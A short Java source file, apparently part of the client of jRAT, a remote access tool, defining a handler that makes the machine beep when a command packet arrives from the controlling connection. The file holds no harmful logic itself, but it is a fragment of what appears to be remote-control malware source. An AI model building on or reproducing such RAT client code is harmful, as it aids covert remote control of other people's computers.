package jrat.client.packets.incoming;

import jrat.client.Connection;

import java.awt.*;

public class Packet65Beep implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Toolkit.getDefaultToolkit().beep();
	}

}
